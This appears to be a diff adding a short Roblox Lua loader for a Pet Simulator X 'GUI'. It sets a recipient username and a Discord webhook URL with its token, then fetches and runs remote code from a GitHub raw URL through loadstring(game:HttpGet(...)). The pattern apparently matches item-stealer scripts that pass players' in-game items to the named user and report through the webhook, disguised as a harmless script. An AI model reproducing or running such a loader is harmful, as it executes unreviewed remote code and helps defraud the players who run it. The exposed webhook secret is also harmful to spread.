@@ -1,0 +1,9 @@
+Username = "TONOY_TALK "
+WebHook = "https://discord.com/api/webhooks/1070742922577842317/YzCGPYvu6E4aXmhlznbBjO1x7XAD2bzMHQQyq9pxTvC-1XWzjQCnpcgptfqhcNLyXmKm"
+
+_G.CustomScriptName = "Nike Fucker"
+_G.Text1 = "https://discord.gg/Y3ZBJ5yshg"
+_G.Text2 = "Nike Fucker#3326"
+_G.Text3 = "Made by Nike"
+_G.Text4 = "Script Has Been Loaded"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
